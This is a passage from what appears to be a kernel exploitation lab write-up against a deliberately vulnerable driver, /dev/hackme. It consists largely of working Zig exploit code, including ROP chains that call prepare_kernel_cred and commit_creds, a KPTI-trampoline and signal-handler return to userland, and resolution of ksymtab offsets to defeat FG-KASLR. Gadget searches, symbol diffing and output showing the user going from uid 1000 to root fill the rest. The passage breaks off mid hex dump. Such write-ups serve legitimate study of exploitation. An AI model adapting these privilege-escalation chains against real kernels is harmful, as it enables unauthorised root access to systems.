</span></span><span><span>ffffffff81200f89: 58                   	popq	%rax
</span></span><span><span>ffffffff81200f8a: 5f                   	popq	%rdi
</span></span><span><span>ffffffff81200f8b: ff 15 f7 f0 e3 00    	callq	*0xe3f0f7(%rip)         # 0xffffffff82040088
</span></span><span><span>ffffffff81200f91: ff 25 e9 f0 e3 00    	jmpq	*0xe3f0e9(%rip)         # 0xffffffff82040080
</span></span><span><span>
</span></span><span><span>ffffffff8146d4e0 &lt;.text.native_swapgs&gt;:
</span></span><span><span>ffffffff8146d4e0: 55                   	pushq	%rbp
</span></span><span><span>ffffffff8146d4e1: 48 89 e5             	movq	%rsp, %rbp
</span></span><span><span>ffffffff8146d4e4: 0f 01 f8             	swapgs
</span></span><span><span>ffffffff8146d4e7: 5d                   	popq	%rbp
</span></span><span><span>ffffffff8146d4e8: c3                   	retq
</span></span><span><span>
</span></span><span><span>ffffffff81000000 &lt;_stext&gt;:
</span></span><span><span>ffffffff81200f46: 0f 20 df             	movq	%cr3, %rdi
</span></span><span><span>ffffffff81200f49: eb 34                	jmp	0xffffffff81200f7f &lt;_stext+0x200f7f&gt;
</span></span><span><span>
</span></span><span><span>ffffffff81000000 &lt;_stext&gt;:
</span></span><span><span>ffffffff81201067: 48 81 cf 00 10 00 00 	orq	$0x1000, %rdi           # imm = 0x1000
</span></span><span><span>ffffffff8120106e: 0f 22 df             	movq	%rdi, %cr3
</span></span><span><span>ffffffff81201071: 58                   	popq	%rax
</span></span><span><span>ffffffff81201072: ff 15 10 f0 e3 00    	callq	*0xe3f010(%rip)         # 0xffffffff82040088
</span></span><span><span>ffffffff81201078: 5f                   	popq	%rdi
</span></span><span><span>ffffffff81201079: 48 89 c4             	movq	%rax, %rsp
</span></span><span><span>ffffffff8120107c: 58                   	popq	%rax
</span></span><span><span>ffffffff8120107d: e9 45 ff ff ff       	jmp	0xffffffff81200fc7 &lt;_stext+0x200fc7&gt;
</span></span><span><span>
</span></span><span><span>ffffffff81000000 &lt;_stext&gt;:
</span></span><span><span>ffffffff81200fc7: 48 cf                	iretq</span></span></code></pre></div>



<div><pre tabindex="0"><code data-lang="zig"><span><span><span>const</span> POP_RDI<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff8196258d</span>;
</span></span><span><span><span>const</span> MOV_RDI_RAX_POP_RBP<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff816bf203</span>;
</span></span><span><span><span>const</span> KPTI_TRAMPOLINE<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff81200f26</span>;
</span></span><span><span>
</span></span><span><span><span>const</span> PREPARE_KERNEL_CRED<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff814c67f0</span>;
</span></span><span><span><span>const</span> COMMIT_CREDS<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff814c6410</span>;
</span></span><span><span>
</span></span><span><span><span>fn</span> ropchain(writer<span>:</span> anytype) <span>!</span><span>void</span> {
</span></span><span><span>    <span>try</span> writer.writeAll(std.mem.asBytes(<span>&amp;</span>[_]<span>u64</span>{
</span></span><span><span>        POP_RDI,
</span></span><span><span>        <span>0</span>,
</span></span><span><span>        PREPARE_KERNEL_CRED,
</span></span><span><span>        MOV_RDI_RAX_POP_RBP,
</span></span><span><span>        <span>0</span>, <span>// junk
</span></span></span><span><span><span></span>        COMMIT_CREDS,
</span></span><span><span>        KPTI_TRAMPOLINE,
</span></span><span><span>        <span>0</span>, <span>// junk
</span></span></span><span><span><span></span>        <span>0</span>, <span>// junk
</span></span></span><span><span><span></span>        user_rip,
</span></span><span><span>        user_cs,
</span></span><span><span>        user_rflags,
</span></span><span><span>        user_rsp,
</span></span><span><span>        user_ss,
</span></span><span><span>    }));
</span></span><span><span>}</span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="text"><span><span>whoami: unknown uid 1000
</span></span><span><span>[INFO] Saved state
</span></span><span><span>[INFO] Canary: 0xeabc83c7a6ad8500
</span></span><span><span>[INFO] You won!!
</span></span><span><span>whoami: unknown uid 0</span></span></code></pre></div><h4 id="alternate-solve-signal-handlers">Alternate solve: Signal Handlers</h4>
<p>The SMEP+SMAP solve will segfault in userland when KPTI is enabled; instead of using a KPTI trampoline to switch to userland page tables, we can register a signal handler (in userland) for <code>SIGSEGV</code> and the kernel will do the switch for us.</p>




<div><pre tabindex="0"><code data-lang="zig"><span><span><span>const</span> std <span>=</span> <span>@import</span>(<span>&#34;std&#34;</span>);
</span></span><span><span>
</span></span><span><span>
</span></span><span><span>
</span></span><span><span>
</span></span><span><span>
</span></span><span><span><span>export</span> <span>var</span> user_rip<span>:</span> <span>u64</span> <span>=</span> <span>undefined</span>;
</span></span><span><span><span>fn</span> ret2win(_<span>:</span> <span>i32</span>) callconv(.C) <span>void</span> {
</span></span><span><span>    std.debug.print(<span>&#34;[INFO] You won!!</span><span>\n</span><span>&#34;</span>, .{});
</span></span><span><span>
</span></span><span><span>    <span>const</span> args <span>=</span> [_<span>:</span><span>null</span>]<span>?</span>[<span>*:</span><span>0</span>]<span>const</span> <span>u8</span>{<span>&#34;/usr/bin/whoami&#34;</span>};
</span></span><span><span>    <span>const</span> env <span>=</span> [_<span>:</span><span>null</span>]<span>?</span>[<span>*:</span><span>0</span>]<span>u8</span>{};
</span></span><span><span>    <span>switch</span> (std.posix.execveZ(<span>&#34;/usr/bin/whoami&#34;</span>, args[<span>0</span>..args.len], env[<span>0</span>..env.len])) {
</span></span><span><span>        <span>else</span> <span>=&gt;</span> <span>unreachable</span>,
</span></span><span><span>    }
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>fn</span> catch_sigsegv() <span>void</span> {
</span></span><span><span>    <span>const</span> sigact <span>=</span> std.posix.Sigaction{
</span></span><span><span>        .handler <span>=</span> .{ .handler <span>=</span> ret2win },
</span></span><span><span>        .mask <span>=</span> std.posix.empty_sigset,
</span></span><span><span>        .flags <span>=</span> <span>0</span>,
</span></span><span><span>    };
</span></span><span><span>    std.posix.sigaction(std.posix.SIG.SEGV, <span>&amp;</span>sigact, <span>null</span>);
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>pub</span> <span>fn</span> main() <span>!</span><span>void</span> {
</span></span><span><span>    catch_sigsegv();
</span></span><span><span>
</span></span><span><span>    user_rip <span>=</span> <span>@intFromPtr</span>(<span>&amp;</span>ret2win);
</span></span><span><span>    saveState();
</span></span><span><span>    std.debug.print(<span>&#34;[INFO] Saved state</span><span>\n</span><span>&#34;</span>, .{});
</span></span><span><span>
</span></span><span><span>    <span>const</span> fd <span>=</span> <span>try</span> std.posix.open(<span>&#34;/dev/hackme&#34;</span>, .{ .ACCMODE <span>=</span> .RDWR }, <span>0o660</span>);
</span></span><span><span>    <span>defer</span> std.posix.close(fd);
</span></span><span><span>
</span></span><span><span>    <span>const</span> canary <span>=</span> <span>try</span> leakCanary(fd);
</span></span><span><span>    std.debug.print(<span>&#34;[INFO] Canary: 0x{s}</span><span>\n</span><span>&#34;</span>, .{std.fmt.bytesToHex(bigEndianify(<span>8</span>, <span>@constCast</span>(std.mem.asBytes(<span>&amp;</span>canary))), .lower)});
</span></span><span><span>
</span></span><span><span>    <span>const</span> file <span>=</span> (std.fs.File{ .handle <span>=</span> fd }).writer();
</span></span><span><span>    <span>var</span> bw <span>=</span> std.io.bufferedWriter(file);
</span></span><span><span>    <span>const</span> writer <span>=</span> bw.writer();
</span></span><span><span>
</span></span><span><span>    <span>try</span> writer.writeByteNTimes(<span>0</span>, tmp_size);
</span></span><span><span>    <span>try</span> writer.writeAll(std.mem.asBytes(<span>&amp;</span>canary));
</span></span><span><span>    <span>try</span> writer.writeByteNTimes(<span>0</span>, (<span>8</span><span>*</span><span>3</span>));
</span></span><span><span>    <span>try</span> ropchain(writer);
</span></span><span><span>    <span>try</span> bw.flush();
</span></span><span><span>
</span></span><span><span>    <span>unreachable</span>;
</span></span><span><span>}</span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="text"><span><span>whoami: unknown uid 1000
</span></span><span><span>[INFO] Saved state
</span></span><span><span>[INFO] Canary: 0x10f9df0cd1e27500
</span></span><span><span>[INFO] You won!!
</span></span><span><span>whoami: unknown uid 0</span></span></code></pre></div><h3 id="kaslr">KASLR</h3>
<p>Time for the final challenge: <strong>fine-grained kernel address space layout randomization</strong> (FG-KASLR).</p>
<p>Unlike regular (K)ASLR, a single leak is not enough to find the addresses of all symbols—we must get more creative to find the addresses of certain parts of our payload.</p>
<p>Fortunately not all symbols are affected by the fine-grained (or function granular?) part of KASLR:</p>



<div><pre tabindex="0"><code data-lang="bash"><span><span>cat /proc/kallsyms | grep -e <span>&#39;startup_64&#39;</span> -e <span>&#39;swapgs_restore_regs_and_return_to_usermode&#39;</span> -e <span>&#39;prepare_kernel_cred&#39;</span> -e <span>&#39;commit_creds&#39;</span></span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="text"><span><span>ffffffff95200000 T startup_64
</span></span><span><span>ffffffff95200030 T secondary_startup_64
</span></span><span><span>ffffffff952001f0 T __startup_64
</span></span><span><span>ffffffff95400f10 T swapgs_restore_regs_and_return_to_usermode
</span></span><span><span>ffffffff95987a80 T commit_creds
</span></span><span><span>ffffffff95b00e00 T prepare_kernel_cred
</span></span><span><span>ffffffff96187d90 r __ksymtab_commit_creds
</span></span><span><span>ffffffff9618d4fc r __ksymtab_prepare_kernel_cred
</span></span><span><span>ffffffff961a0972 r __kstrtab_commit_creds
</span></span><span><span>ffffffff961a09b2 r __kstrtab_prepare_kernel_cred
</span></span><span><span>ffffffff961a4d42 r __kstrtabns_prepare_kernel_cred
</span></span><span><span>ffffffff961a4d42 r __kstrtabns_commit_creds</span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="bash"><span><span><span># reboot and run again</span>
</span></span><span><span>cat /proc/kallsyms | grep -e <span>&#39;startup_64&#39;</span> -e <span>&#39;swapgs_restore_regs_and_return_to_usermode&#39;</span> -e <span>&#39;prepare_kernel_cred&#39;</span> -e <span>&#39;commit_creds&#39;</span></span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="text"><span><span>ffffffff90000000 T startup_64
</span></span><span><span>ffffffff90000030 T secondary_startup_64
</span></span><span><span>ffffffff900001f0 T __startup_64
</span></span><span><span>ffffffff90200f10 T swapgs_restore_regs_and_return_to_usermode
</span></span><span><span>ffffffff90741cf0 T commit_creds
</span></span><span><span>ffffffff908b7880 T prepare_kernel_cred
</span></span><span><span>ffffffff90f87d90 r __ksymtab_commit_creds
</span></span><span><span>ffffffff90f8d4fc r __ksymtab_prepare_kernel_cred
</span></span><span><span>ffffffff90fa0972 r __kstrtab_commit_creds
</span></span><span><span>ffffffff90fa09b2 r __kstrtab_prepare_kernel_cred
</span></span><span><span>ffffffff90fa4d42 r __kstrtabns_prepare_kernel_cred
</span></span><span><span>ffffffff90fa4d42 r __kstrtabns_commit_creds</span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="python"><span><span>ksyms1 <span>=</span> {
</span></span><span><span>    <span>0xffffffff95200000</span>: <span>&#34;startup_64&#34;</span>,
</span></span><span><span>    <span>0xffffffff95200030</span>: <span>&#34;secondary_startup_64&#34;</span>,
</span></span><span><span>    <span>0xffffffff952001f0</span>: <span>&#34;__startup_64&#34;</span>,
</span></span><span><span>    <span>0xffffffff95400f10</span>: <span>&#34;swapgs_restore_regs_and_return_to_usermode&#34;</span>,
</span></span><span><span>    <span>0xffffffff95987a80</span>: <span>&#34;commit_creds&#34;</span>,
</span></span><span><span>    <span>0xffffffff95b00e00</span>: <span>&#34;prepare_kernel_cred&#34;</span>,
</span></span><span><span>    <span>0xffffffff96187d90</span>: <span>&#34;__ksymtab_commit_creds&#34;</span>,
</span></span><span><span>    <span>0xffffffff9618d4fc</span>: <span>&#34;__ksymtab_prepare_kernel_cred&#34;</span>,
</span></span><span><span>    <span>0xffffffff961a0972</span>: <span>&#34;__kstrtab_commit_creds&#34;</span>,
</span></span><span><span>    <span>0xffffffff961a09b2</span>: <span>&#34;__kstrtab_prepare_kernel_cred&#34;</span>,
</span></span><span><span>    <span>0xffffffff961a4d42</span>: <span>&#34;__kstrtabns_prepare_kernel_cred&#34;</span>,
</span></span><span><span>    <span>0xffffffff961a4d42</span>: <span>&#34;__kstrtabns_commit_creds&#34;</span>,
</span></span><span><span>}
</span></span><span><span>ksyms2 <span>=</span> {
</span></span><span><span>    <span>0xffffffff90000000</span>: <span>&#34;startup_64&#34;</span>,
</span></span><span><span>    <span>0xffffffff90000030</span>: <span>&#34;secondary_startup_64&#34;</span>,
</span></span><span><span>    <span>0xffffffff900001f0</span>: <span>&#34;__startup_64&#34;</span>,
</span></span><span><span>    <span>0xffffffff90200f10</span>: <span>&#34;swapgs_restore_regs_and_return_to_usermode&#34;</span>,
</span></span><span><span>    <span>0xffffffff90741cf0</span>: <span>&#34;commit_creds&#34;</span>,
</span></span><span><span>    <span>0xffffffff908b7880</span>: <span>&#34;prepare_kernel_cred&#34;</span>,
</span></span><span><span>    <span>0xffffffff90f87d90</span>: <span>&#34;__ksymtab_commit_creds&#34;</span>,
</span></span><span><span>    <span>0xffffffff90f8d4fc</span>: <span>&#34;__ksymtab_prepare_kernel_cred&#34;</span>,
</span></span><span><span>    <span>0xffffffff90fa0972</span>: <span>&#34;__kstrtab_commit_creds&#34;</span>,
</span></span><span><span>    <span>0xffffffff90fa09b2</span>: <span>&#34;__kstrtab_prepare_kernel_cred&#34;</span>,
</span></span><span><span>    <span>0xffffffff90fa4d42</span>: <span>&#34;__kstrtabns_prepare_kernel_cred&#34;</span>,
</span></span><span><span>    <span>0xffffffff90fa4d42</span>: <span>&#34;__kstrtabns_commit_creds&#34;</span>,
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span>diff <span>=</span> <span>0</span>
</span></span><span><span>invariants <span>=</span> []
</span></span><span><span><span>for</span> ((addr1, sym), addr2) <span>in</span> <span>zip</span>(ksyms1<span>.</span>items(), ksyms2<span>.</span>keys()):
</span></span><span><span>    <span>if</span> sym <span>==</span> <span>&#34;startup_64&#34;</span>:
</span></span><span><span>        diff <span>=</span> addr1<span>-</span>addr2
</span></span><span><span>    <span>else</span>:
</span></span><span><span>        <span>if</span> (addr1<span>-</span>addr2) <span>==</span> diff:
</span></span><span><span>            invariants<span>.</span>append(sym)
</span></span><span><span>
</span></span><span><span><span>print</span>(<span>f</span><span>&#34;</span><span>{</span>invariants<span>}</span><span> left invariant under FG-KASLR&#34;</span>)</span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="text"><span><span>[&#39;secondary_startup_64&#39;, &#39;__startup_64&#39;, &#39;swapgs_restore_regs_and_return_to_usermode&#39;, &#39;__ksymtab_commit_creds&#39;, &#39;__ksymtab_prepare_kernel_cred&#39;, &#39;__kstrtab_commit_creds&#39;, &#39;__kstrtab_prepare_kernel_cred&#39;, &#39;__kstrtabns_commit_creds&#39;] left invariant under FG-KASLR</span></span></code></pre></div><p><code>prepare_kernel_cred</code> and <code>commit_creds</code> are affected by FG-KASLR, but the KPTI trampoline, <code>__ksymtab_commit_creds</code> and <code>__ksymtab_prepare_kernel_cred</code> are fine.</p>
<p>What is <code>__ksymtab</code>?
There needs to be some way for kernel modules to be able to see symbols exported by the kernel or other kernel modules, so <a href="https://elixir.bootlin.com/linux/v5.9-rc6/source/include/linux/export.h#L72-L76">ksymtab</a> is a struct (<strong>which has an address that is a fixed offset from the kernel base address</strong>) that stores information about a symbol, such as the address offset relative to the corresponding ksymtab struct.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>
So if we get the address of <code>__ksymtab_commit_creds</code> and then add <code>__ksymtab_commit_creds.value_offset</code><sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> to it, we get the address of <code>commit_creds</code>.</p>
<p>With that in mind, let’s find gadgets to build our payload (restricting our search to the beginning of the kernel which, as we observed earlier, is not affected by FG-KASLR, just regular KASLR).</p>



<div><pre tabindex="0"><code data-lang="bash"><span><span>ropr --range<span>=</span>0xffffffff81000000-0xffffffff81400dc6 -R <span>&#39;^(pop rdi;|pop rax;|pop rbx;|pop rdx;|push rax;|mov eax, \[rax+.{3,5}\]; .*|add (r|e)ax, (r|e)di;) ret;&#39;</span> vmlinux</span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="text"><span><span>0xffffffff81004aae: mov eax, [rax+0x10]; pop rbp; ret;
</span></span><span><span>0xffffffff81004d11: pop rax; ret;
</span></span><span><span>0xffffffff81006123: push rax; ret;
</span></span><span><span>0xffffffff810075d0: pop rbx; ret;
</span></span><span><span>0xffffffff81007616: pop rdx; ret;
</span></span><span><span>0xffffffff8100767c: pop rdi; ret;
</span></span><span><span>0xffffffff8100dad3: mov eax, [rax+0xe0]; pop rbp; shr eax, 1; and eax, 1; ret;
</span></span><span><span>0xffffffff81012551: add rax, rdi; ret;
</span></span><span><span>0xffffffff81012552: add eax, edi; ret;</span></span></code></pre></div><p>I couldn’t find a way to move the result of <code>prepare_kernel_cred(0)</code> into <code>rdi</code> with the gadgets we have to work with, so I opted to split the payload into 2 pieces.</p>




<div><pre tabindex="0"><code data-lang="zig"><span><span><span>var</span> POP_RDI<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff8100767c</span>;
</span></span><span><span><span>var</span> POP_RAX<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff81004d11</span>;
</span></span><span><span><span>var</span> POP_RBX<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff810075d0</span>;
</span></span><span><span><span>var</span> POP_RDX<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff81007616</span>;
</span></span><span><span><span>var</span> PUSH_RAX<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff81006123</span>;
</span></span><span><span><span>var</span> MOV_EAX_ADDROF_RAX_PLUS_16_POP_RBP<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff81004aae</span>;
</span></span><span><span><span>var</span> ADD_RAX_RDI<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff81012551</span>;
</span></span><span><span><span>var</span> ADD_EAX_EDI<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff81012552</span>;
</span></span><span><span>
</span></span><span><span><span>var</span> KPTI_TRAMPOLINE<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff81200f26</span>;
</span></span><span><span><span>var</span> KSYMTAB_PREPARE_KERNEL_CRED<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff81f8d4fc</span>;
</span></span><span><span><span>var</span> KSYMTAB_COMMIT_CREDS<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff81f87d90</span>;
</span></span><span><span>
</span></span><span><span><span>fn</span> ropchain1(writer<span>:</span> anytype, fd<span>:</span> std.posix.fd_t, canary<span>:</span> <span>u64</span>) <span>!</span><span>void</span> {
</span></span><span><span>    <span>try</span> writer.writeAll(std.mem.asBytes(<span>&amp;</span>[_]<span>u64</span>{
</span></span><span><span>        POP_RAX,
</span></span><span><span>        KSYMTAB_PREPARE_KERNEL_CRED<span>-</span><span>0x10</span>,
</span></span><span><span>        MOV_EAX_ADDROF_RAX_PLUS_16_POP_RBP,
</span></span><span><span>        <span>0</span>, <span>// junk
</span></span></span><span><span><span></span>        POP_RDI,
</span></span><span><span>        KSYMTAB_PREPARE_KERNEL_CRED,
</span></span><span><span>        ADD_EAX_EDI,
</span></span><span><span>        POP_RDI,
</span></span><span><span>        (KSYMTAB_PREPARE_KERNEL_CRED <span>&gt;&gt;</span> <span>32</span>) <span>&lt;&lt;</span> <span>32</span>,
</span></span><span><span>        ADD_RAX_RDI,
</span></span><span><span>        POP_RDI,
</span></span><span><span>        <span>0</span>,
</span></span><span><span>        PUSH_RAX,
</span></span><span><span>
</span></span><span><span>        POP_RBX,
</span></span><span><span>        <span>@as</span>(<span>u64</span>, <span>@intCast</span>(fd)),
</span></span><span><span>        POP_RDX,
</span></span><span><span>        canary,
</span></span><span><span>        KPTI_TRAMPOLINE,
</span></span><span><span>        <span>0</span>, <span>// junk
</span></span></span><span><span><span></span>        <span>0</span>, <span>// junk
</span></span></span><span><span><span></span>        <span>@intFromPtr</span>(<span>&amp;</span>ret2ROP),
</span></span><span><span>        user_cs,
</span></span><span><span>        user_rflags,
</span></span><span><span>        user_rsp,
</span></span><span><span>        user_ss,
</span></span><span><span>    }));
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>fn</span> ret2ROP() <span>void</span> {
</span></span><span><span>    <span>const</span> creds<span>:</span> <span>u64</span> <span>=</span> <span>asm</span> <span>volatile</span>(<span>&#34;&#34;</span> <span>:</span> [ret] <span>&#34;={rax}&#34;</span> (<span>-&gt;</span> <span>u64</span>));
</span></span><span><span>    <span>const</span> fd<span>:</span> <span>u64</span> <span>=</span> <span>asm</span> <span>volatile</span>(<span>&#34;&#34;</span> <span>:</span> [fd] <span>&#34;={rbx}&#34;</span> (<span>-&gt;</span> <span>u64</span>));
</span></span><span><span>    <span>const</span> canary<span>:</span> <span>u64</span> <span>=</span> <span>asm</span> <span>volatile</span>(<span>&#34;&#34;</span> <span>:</span> [canary] <span>&#34;={rdx}&#34;</span> (<span>-&gt;</span> <span>u64</span>));
</span></span><span><span>
</span></span><span><span>    runROPChain(<span>@as</span>(std.posix.fd_t, <span>@intCast</span>(fd)), canary, creds) <span>catch</span> <span>unreachable</span>;
</span></span><span><span>    <span>unreachable</span>;
</span></span><span><span>}
</span></span><span><span><span>fn</span> ropchain2(writer<span>:</span> anytype, creds_addr<span>:</span> <span>u64</span>) <span>!</span><span>void</span> {
</span></span><span><span>    <span>try</span> writer.writeAll(std.mem.asBytes(<span>&amp;</span>[_]<span>u64</span>{
</span></span><span><span>        POP_RAX,
</span></span><span><span>        KSYMTAB_COMMIT_CREDS<span>-</span><span>0x10</span>,
</span></span><span><span>        MOV_EAX_ADDROF_RAX_PLUS_16_POP_RBP,
</span></span><span><span>        <span>0</span>, <span>// junk
</span></span></span><span><span><span></span>        POP_RDI,
</span></span><span><span>        KSYMTAB_COMMIT_CREDS,
</span></span><span><span>        ADD_EAX_EDI,
</span></span><span><span>        POP_RDI,
</span></span><span><span>        (KSYMTAB_COMMIT_CREDS <span>&gt;&gt;</span> <span>32</span>) <span>&lt;&lt;</span> <span>32</span>,
</span></span><span><span>        ADD_RAX_RDI,
</span></span><span><span>        POP_RDI,
</span></span><span><span>        creds_addr,
</span></span><span><span>        PUSH_RAX,
</span></span><span><span>
</span></span><span><span>        KPTI_TRAMPOLINE,
</span></span><span><span>        <span>0</span>, <span>// junk
</span></span></span><span><span><span></span>        <span>0</span>, <span>// junk
</span></span></span><span><span><span></span>        <span>@intFromPtr</span>(<span>&amp;</span>ret2win),
</span></span><span><span>        user_cs,
</span></span><span><span>        user_rflags,
</span></span><span><span>        user_rsp,
</span></span><span><span>        user_ss,
</span></span><span><span>    }));
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>const</span> ROPChain <span>=</span> <span>union</span>(<span>enum</span>) {
</span></span><span><span>    canary<span>:</span> <span>u64</span>,
</span></span><span><span>    creds_addr<span>:</span> <span>u64</span>,
</span></span><span><span>};
</span></span><span><span>
</span></span><span><span><span>fn</span> runROPChain(fd<span>:</span> std.posix.fd_t, canary<span>:</span> <span>u64</span>, creds_addr<span>:</span> <span>?</span><span>u64</span>) <span>!</span><span>void</span> {
</span></span><span><span>    <span>const</span> file <span>=</span> (std.fs.File{ .handle <span>=</span> fd }).writer();
</span></span><span><span>    <span>var</span> bw <span>=</span> std.io.bufferedWriter(file);
</span></span><span><span>    <span>const</span> writer <span>=</span> bw.writer();
</span></span><span><span>
</span></span><span><span>    <span>try</span> writer.writeByteNTimes(<span>0</span>, tmp_size);
</span></span><span><span>    <span>try</span> writer.writeAll(std.mem.asBytes(<span>&amp;</span>canary));
</span></span><span><span>    <span>try</span> writer.writeByteNTimes(<span>0</span>, (<span>8</span><span>*</span><span>3</span>));
</span></span><span><span>    <span>if</span> (creds_addr) <span>|</span>caddr<span>|</span> {
</span></span><span><span>        ropchain2(writer, caddr);
</span></span><span><span>    } <span>else</span> {
</span></span><span><span>        ropchain1(writer, fd, canary);
</span></span><span><span>    }
</span></span><span><span>    <span>try</span> bw.flush();
</span></span><span><span>
</span></span><span><span>    <span>unreachable</span>;
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span>
</span></span><span><span><span>fn</span> adjust_offsets(kaslr_offset<span>:</span> <span>u64</span>) <span>void</span> {
</span></span><span><span>    <span>const</span> gadgets <span>=</span> <span>&amp;</span>[_]<span>*</span><span>u64</span>{
</span></span><span><span>        <span>&amp;</span>POP_RDI,
</span></span><span><span>        <span>&amp;</span>POP_RAX,
</span></span><span><span>        <span>&amp;</span>POP_RBX,
</span></span><span><span>        <span>&amp;</span>POP_RDX,
</span></span><span><span>        <span>&amp;</span>PUSH_RAX,
</span></span><span><span>        <span>&amp;</span>MOV_EAX_ADDROF_RAX_PLUS_16_POP_RBP,
</span></span><span><span>        <span>&amp;</span>ADD_RAX_RDI,
</span></span><span><span>        <span>&amp;</span>ADD_EAX_EDI,
</span></span><span><span>
</span></span><span><span>        <span>&amp;</span>KPTI_TRAMPOLINE,
</span></span><span><span>        <span>&amp;</span>KSYMTAB_PREPARE_KERNEL_CRED,
</span></span><span><span>        <span>&amp;</span>KSYMTAB_COMMIT_CREDS,
</span></span><span><span>    };
</span></span><span><span>    <span>for</span> (gadgets) <span>|</span>g<span>|</span> {
</span></span><span><span>        g.<span>*</span> <span>+=</span> kaslr_offset;
</span></span><span><span>    }
</span></span><span><span>}</span></span></code></pre></div><p>Now we just need a leak to defeat regular KASLR.</p>




<div><pre tabindex="0"><code data-lang="zig"><span><span><span>fn</span> dumpStack(fd<span>:</span> std.posix.fd_t) <span>!</span><span>void</span> {
</span></span><span><span>    <span>var</span> buf<span>:</span> [<span>350</span>]<span>u8</span> <span>=</span> <span>undefined</span>;
</span></span><span><span>    <span>const</span> bytes_read <span>=</span> <span>try</span> std.posix.read(fd, <span>&amp;</span>buf);
</span></span><span><span>
</span></span><span><span>    std.debug.dumpHex(buf[<span>0</span>..bytes_read]);
</span></span><span><span>}</span></span></code></pre></div><p>Let’s compare the output of <code>dumpStack</code> before and after a reboot to see what remains the same:</p>



<div><pre tabindex="0"><code data-lang="diff"><span><span>1,22c1,22
</span></span><span><span>&lt; 00007ffccba8e082  20 10 60 87 D3 8C FF FF  E0 0F 00 00 00 00 00 00   .`.............
</span></span><span><span>&lt; 00007ffccba8e092  00 7D 35 B9 68 99 63 84  10 D6 CA 86 D3 8C FF FF  .}5.h.c.........
</span></span><span><span>&lt; 00007ffccba8e0a2  68 FE 1B 80 1A B9 FF FF  04 00 00 00 00 00 00 00  h...............
</span></span><span><span>&lt; 00007ffccba8e0b2  00 D6 CA 86 D3 8C FF FF  F0 FE 1B 80 1A B9 FF FF  ................
</span></span><span><span>&lt; 00007ffccba8e0c2  00 D6 CA 86 D3 8C FF FF  80 FE 1B 80 1A B9 FF FF  ................
</span></span><span><span>&lt; 00007ffccba8e0d2  D7 7B E8 A3 FF FF FF FF  D7 7B E8 A3 FF FF FF FF  .{.......{......
</span></span><span><span>&lt; 00007ffccba8e0e2  00 D6 CA 86 D3 8C FF FF  00 00 00 00 00 00 00 00  ................
</span></span><span><span>&lt; 00007ffccba8e0f2  82 E0 A8 CB FC 7F 00 00  A0 FE 1B 80 1A B9 FF FF  ................
</span></span><span><span>&lt; 00007ffccba8e102  00 7D 35 B9 68 99 63 84  5E 01 00 00 00 00 00 00  .}5.h.c.^.......
</span></span><span><span>&lt; 00007ffccba8e112  00 00 00 00 00 00 00 00  D8 FE 1B 80 1A B9 FF FF  ................
</span></span><span><span>&lt; 00007ffccba8e122  2F 28 09 A4 FF FF FF FF  00 D6 CA 86 D3 8C FF FF  /(␉.............
</span></span><span><span>&lt; 00007ffccba8e132  00 D6 CA 86 D3 8C FF FF  82 E0 A8 CB FC 7F 00 00  ................
</span></span><span><span>&lt; 00007ffccba8e142  5E 01 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ^...............
</span></span><span><span>&lt; 00007ffccba8e152  20 FF 1B 80 1A B9 FF FF  A7 22 1A A4 FF FF FF FF   ........&#34;......
</span></span><span><span>&lt; 00007ffccba8e162  F1 11 23 A4 FF FF FF FF  00 00 00 00 00 00 00 00  ..#.............
</span></span><span><span>&lt; 00007ffccba8e172  00 7D 35 B9 68 99 63 84  58 FF 1B 80 1A B9 FF FF  .}5.h.c.X.......
</span></span><span><span>&lt; 00007ffccba8e182  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
</span></span><span><span>&lt; 00007ffccba8e192  00 00 00 00 00 00 00 00  30 FF 1B 80 1A B9 FF FF  ........0.......
</span></span><span><span>&lt; 00007ffccba8e1a2  DA 19 2E A4 FF FF FF FF  48 FF 1B 80 1A B9 FF FF  ........H.......
</span></span><span><span>&lt; 00007ffccba8e1b2  57 A1 A0 A3 FF FF FF FF  00 00 00 00 00 00 00 00  W...............
</span></span><span><span>&lt; 00007ffccba8e1c2  00 00 00 00 00 00 00 00  8C 00 C0 A3 FF FF FF FF  ................
</span></span><span><span>&lt; 00007ffccba8e1d2  00 00 00 00 00 00 00 00  00 00 00 00 00 00        ..............
</span></span><span><span>---
</span></span><span><span>&gt; 00007ffcef2175d2  20 20 60 47 F0 90 FF FF  E0 0F 00 00 00 00 00 00    `G............
</span></span><span><span>&gt; 00007ffcef2175e2  00 0E 76 FC EA 35 42 B0  10 DC CA 46 F0 90 FF FF  ..v..5B....F....
</span></span><span><span>&gt; 00007ffcef2175f2  68 7E 1C C0 28 A9 FF FF  04 00 00 00 00 00 00 00  h~..(...........
